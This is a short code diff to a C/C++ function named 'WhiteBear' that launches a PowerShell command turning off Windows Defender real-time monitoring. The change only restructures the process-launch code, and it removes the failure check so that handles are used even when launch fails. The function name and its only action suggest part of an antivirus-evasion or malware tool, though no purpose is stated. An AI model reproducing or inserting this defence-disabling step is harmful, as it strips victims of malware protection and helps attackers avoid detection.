@@ -15,26 +15,23 @@ int WhiteBear(){
     // The command you want to run
     LPCSTR cmd = "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true";
 
-    if (CreateProcessA(
-            NULL,
-            (LPSTR)cmd,
-            NULL,
-            NULL,
-            FALSE,
-            0,
-            NULL,
-            NULL,
-            &si,
-            &pi))
-    {
-        // Wait for the command to finish
-        WaitForSingleObject(pi.hProcess, INFINITE);
+    CreateProcessA(
+        NULL,
+        (LPSTR)cmd,
+        NULL,
+        NULL,
+        FALSE,
+        0,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
 
-        // Cleanup
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
 
     return 0;
 }
